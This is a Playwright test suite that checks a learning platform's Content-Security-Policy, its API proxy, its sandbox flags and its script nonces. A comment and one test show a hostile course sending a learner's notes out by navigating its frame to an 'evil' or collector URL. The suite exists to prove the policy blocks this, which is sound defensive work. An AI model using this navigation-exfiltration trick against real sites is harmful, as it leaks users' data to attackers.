import { test, expect, type Page } from "@playwright/test";
import { createServer, type Server } from "node:http";
import { API, LEARNER, openSession, signIn, skipWithoutApi } from "./support/api";

/**
 * The shell's Content-Security-Policy, and the one thing it is really for.
 *
 * A course runs in a sandboxed frame on another origin and can navigate *itself*.
 * `location.href = 'https://evil/?d=' + theLearnersNotes` is a network request
 * carrying their work out, and nothing the courses origin sends can stop it:
 * connect-src governs fetch, form-action governs form submission, and there is no
 * directive for where a document may navigate itself. Only the embedding document's
 * frame-src applies — so it has to be the shell that says no.
 *
 * Detection here is server-side. A collector records the requests it actually
 * receives, so a passing test means the request was never made rather than that the
 * page failed to report it.
 */

const SLUG = "docker-fundamentals";
const COLLECTOR_PORT = 4931;
const COLLECTOR = `http://127.0.0.1:${COLLECTOR_PORT}`;

let collector: Server;
let hits: string[] = [];

test.beforeAll(async () => {
  await new Promise<void>((resolve) => {
    collector = createServer((req, res) => {
      hits.push(req.url ?? "");
      res.writeHead(200, { "content-type": "text/html" }).end("<p>collected</p>");
    });
    collector.listen(COLLECTOR_PORT, "127.0.0.1", resolve);
  });
});

test.afterAll(() => {
  collector?.close();
});

test.beforeEach(async ({ page }) => {
  await skipWithoutApi(page);
  await page.route(/fonts\.(googleapis|gstatic)\.com/, (route) => route.abort());
  hits = [];
  await signIn(page, LEARNER);
  await page.goto(`/courses/${SLUG}`);
  const start = page.getByRole("button", { name: "Start this course" });
  if (await start.isVisible().catch(() => false)) await start.click();
});

// Control: the course must be loaded and interactive, or these prove nothing.
const openPlayer = (page: Page) => openSession(page, SLUG, "s1");

const nonceOf = (csp: string) => /'nonce-([^']+)'/.exec(csp)?.[1] ?? null;

test("the shell sends a CSP naming the courses origin", async ({ page }) => {
  const response = await page.goto("/login");
  const csp = response?.headers()["content-security-policy"] ?? "";

  const courses = process.env.NEXT_PUBLIC_COURSES_ORIGIN ?? "http://127.0.0.1:3101";
  expect(csp).toContain("frame-src");
  expect(csp).toContain(courses);
  /**
   * And images, because a course's cover is served from there too (backend, 24 Sep:
   * coverUrl resolves against the courses origin). Pinned separately from frame-src so
   * a tidy-up of one cannot quietly blank every cover in the catalog.
   */
  expect(/img-src ([^;]*)/.exec(csp)?.[1] ?? "").toContain(courses);
  // Bud is not embeddable by anyone.
  expect(csp).toContain("frame-ancestors 'none'");

  // The browser reaches the API only through /api on the app's own origin, so the
  // policy must not name the API's real address — nothing legitimate needs it.
  const connect = /connect-src ([^;]*)/.exec(csp)?.[1] ?? "";
  expect(connect).toContain("'self'");
  expect(connect).not.toContain(new URL(API).host);
});

/**
 * Why /api exists at all. On the free hosts the app and the API are different sites,
 * so a cookie the API sets on its own host never reaches the app — sign-in "works"
 * and every page then bounces to /login. Locally both are "localhost", which would
 * hide that failure completely; asserting that the browser never addresses the API
 * directly is what keeps the local run honest about production.
 */
test("the browser reaches the API only through the app's own origin", async ({
  page,
  context,
  baseURL,
}) => {
  const app = new URL(baseURL!);
  const api = new URL(API);
  const direct: string[] = [];
  const proxied: string[] = [];
  page.on("request", (request) => {
    const url = new URL(request.url());
    const call = `${request.method()} ${url.pathname}`;
    if (url.host === api.host) direct.push(call);
    if (url.host === app.host && url.pathname.startsWith("/api/")) proxied.push(call);
  });

  // beforeEach has already signed in; start again, this time under observation.
  await context.clearCookies();
  const login = page.waitForResponse((r) => r.url().endsWith("/auth/login"));
  await signIn(page, LEARNER);
  await openPlayer(page);
  const tick = page.frameLocator('iframe[title*="Docker"]').locator("#t1");
  await tick.uncheck({ force: true });
  await tick.check({ force: true });
  await expect(page.getByRole("status").filter({ hasText: "Saved" })).toBeVisible();

  expect(direct, "the browser called the API's own origin").toEqual([]);
  expect(proxied).toContain("POST /api/auth/login");
  expect(
    proxied.some((call) => call.startsWith("PUT /api/me/courses/")),
    "bridge saves should go through /api",
  ).toBe(true);

  /**
   * And so the session cookie was set by a response from the app's own host, where
   * server components read it. Checked by where the Set-Cookie came from rather than
   * by the cookie's domain: locally app and API are both "localhost" and cookies
   * ignore ports, so the domain would match whichever host had set it.
   */
  const loginResponse = await login;
  expect(new URL(loginResponse.url()).host).toBe(app.host);
  expect(await loginResponse.headerValue("set-cookie")).toContain("bud_session=");
  expect((await context.cookies()).some((c) => c.name === "bud_session")).toBe(true);
});

/**
 * The rewrite forwards the API's own prefixes and nothing else. A catch-all once
 * put course HTML on the shell's origin — on the free deploy the API's host serves
 * course content too — so a course path under /api must be answered by the shell
 * (a 404 page), never by whatever is behind the rewrite.
 */
test("the shell forwards the API's paths and never course content", async ({ page }) => {
  const get = (path: string) => page.request.get(path, { failOnStatusCode: false });
  const fromApi = (res: Awaited<ReturnType<typeof get>>) =>
    (res.headers()["content-type"] ?? "").includes("application/json");

  // Forwarded: the API answers, in JSON, whether or not we are signed in.
  for (const path of ["/api/health", "/api/courses", "/api/auth/providers", "/api/me"]) {
    expect(fromApi(await get(path)), `${path} should reach the API`).toBe(true);
  }

  /**
   * Not forwarded: course-shaped paths, including ones whose slug is an API prefix,
   * and anything outside the API's prefixes. Identified positively as the shell's own
   * 404 page — its copy, and the shell's CSP, which only pages the shell renders
   * carry. Merely "not JSON" would not do: on the deploy the API's host serves
   * courses too, and a course server's 404 is not JSON either.
   */
  for (const path of [
    `/api/${SLUG}/1.0.0/docker-session-1-worksheet.html`,
    "/api/admin/1.0.0/index.html",
    "/api/me/2.3.4/notes.html",
    "/api/docs",
    "/apiary",
  ]) {
    const res = await get(path);
    expect(res.status(), `${path} should not be forwarded`).toBe(404);
    expect(await res.text(), `${path} should be the shell's own 404`).toContain(
      "This page could not be found",
    );
    expect(res.headers()["content-security-policy"] ?? "", `${path} lacks the shell's CSP`).toContain(
      "frame-ancestors 'none'",
    );
  }
});

/**
 * The courses origin sandboxes every course document itself, with exactly the
 * player iframe's flags, so a course reached outside the player — opened directly,
 * or through any proxy — still gets an opaque origin. Looser than the iframe would
 * be a hole; tighter would break courses inside the player.
 */
test("course documents carry the player's sandbox, flag for flag", async ({ page }) => {
  await openPlayer(page);
  const iframeFlags = await page.locator('iframe[title*="Docker"]').getAttribute("sandbox");

  const frame = page.frames().find((f) => f.url().includes("/docker-session-1"));
  const res = await page.request.get(frame!.url());
  const csp = res.headers()["content-security-policy"] ?? "";
  const sandbox = /(?:^|;\s*)sandbox ([^;]*)/.exec(csp)?.[1].trim();

  const flags = (value?: string | null) => (value ?? "").split(/\s+/).filter(Boolean).sort();
  expect(flags(sandbox), "the courses origin must send a sandbox directive").not.toEqual([]);
  expect(flags(sandbox)).toEqual(flags(iframeFlags));
  for (const forbidden of ["allow-same-origin", "allow-popups", "allow-top-navigation"]) {
    expect(flags(sandbox)).not.toContain(forbidden);
  }
});

test("scripts are locked to a fresh per-request nonce", async ({ page }) => {
  const first = (await page.goto("/login"))?.headers()["content-security-policy"] ?? "";
  const response = await page.goto("/login");
  const second = response?.headers()["content-security-policy"] ?? "";

  expect(first).toMatch(/script-src [^;]*'nonce-[^']+'/);
  // strict-dynamic: host allowlists are ignored, so even an injected <script src>
  // on our own origin is refused unless a nonced script loaded it.
  expect(first).toContain("'strict-dynamic'");

  // A nonce that repeats is a nonce an attacker can learn and reuse.
  expect(nonceOf(first)).not.toBeNull();
  expect(nonceOf(first)).not.toEqual(nonceOf(second));

  /**
   * Next really did stamp *this request's* nonce onto every script it rendered —
   * otherwise the policy would be refusing the app's own code. This reads the HTML
   * as served rather than the live DOM, deliberately: scripts inserted at runtime by
   * an already-nonced script (chunk loading, and the dev HMR client) carry no nonce
   * of their own and don't need one — trusting exactly those is what 'strict-dynamic'
   * is for. A script carrying a *different* nonce would mean a page served from a
   * cache with a stale one, and is the failure this is really looking for.
   */
  const nonce = nonceOf(second)!;
  const tags = (await response!.text()).match(/<script\b[^>]*>/g) ?? [];
  expect(tags.length).toBeGreaterThan(0);
  expect(tags.filter((t) => !t.includes(`nonce="${nonce}"`))).toEqual([]);
});

/**
 * The test that matters most. A policy that silently blocks part of the app is worse
 * than no policy — the page looks fine and a feature quietly stops working. Every
 * screen is visited and every violation the browser raises is collected.
 */
test("no page in the app violates its own policy", async ({ page }) => {
  await page.addInitScript(() => {
    const seen: string[] = [];
    (window as unknown as { __cspViolations: string[] }).__cspViolations = seen;
    document.addEventListener("securitypolicyviolation", (e) => {
      seen.push(`${e.violatedDirective} ← ${e.blockedURI || "(inline)"} @ ${location.pathname}`);
    });
  });

  const violations: string[] = [];
  const visit = async (path: string) => {
    await page.goto(path);
    await page.waitForLoadState("networkidle").catch(() => {});
    violations.push(
      ...(await page.evaluate(
        () => (window as unknown as { __cspViolations?: string[] }).__cspViolations ?? [],
      )),
    );
  };

  // The learner's journey — beforeEach has already signed in and enrolled.
  await visit("/dashboard");
  await visit("/catalog");
  await visit(`/courses/${SLUG}`);
  // Renders the learner's own markdown, which the player's notes panel also does.
  await visit(`/courses/${SLUG}/notes`);
  await openSession(page, SLUG, "s1");
  await page.getByRole("banner").getByRole("button", { name: /^Notes/ }).click();
  await page.getByRole("button", { name: "Preview" }).click();
  violations.push(
    ...(await page.evaluate(
      () => (window as unknown as { __cspViolations?: string[] }).__cspViolations ?? [],
    )),
  );
  await visit("/brand");

  expect(violations, violations.join("\n")).toEqual([]);
});

test("a course cannot navigate its own frame off the courses origin", async ({ page }) => {
  await openPlayer(page);

  const frame = page.frames().find((f) => f.url().includes("3101"));
  expect(frame, "the course frame should be mounted").toBeTruthy();

  // Exactly what a hostile course would do: no popup, no fetch, just leave.
  await frame!
    .evaluate((url) => {
      // This runs inside the course's frame, not the Next app, and navigating away
      // is the attack being tested rather than a routing mistake.
      // eslint-disable-next-line @next/next/no-location-assign-relative-destination
      location.href = `${url}/?stolen=THE_LEARNERS_NOTES`;
    }, COLLECTOR)
    .catch(() => {
      /* the navigation may be torn down; the collector is the real check */
    });

  await page.waitForTimeout(1500);

  expect(hits, "the frame reached an origin frame-src does not allow").toEqual([]);

  /**
   * And it never got there. A blocked navigation leaves the frame blank rather than
   * parked where it started, which is fine — a course that tries this has broken
   * itself, and only itself. That the policy does not break *legitimate* loading is
   * the next test's job, not this one's.
   */
  const reached = page.frames().some((f) => f.url().includes(String(COLLECTOR_PORT)));
  expect(reached, "the frame should never have reached the collector").toBe(false);
});

test("the course still loads and saves with the policy in place", async ({ page }) => {
  await openPlayer(page);

  const tick = page.frameLocator('iframe[title*="Docker"]').locator("#t1");
  await tick.uncheck({ force: true });
  await tick.check({ force: true });

  // frame-src must not have cost the bridge anything.
  await expect(page.getByRole("status").filter({ hasText: "Saved" })).toBeVisible();
  expect(hits).toEqual([]);
});
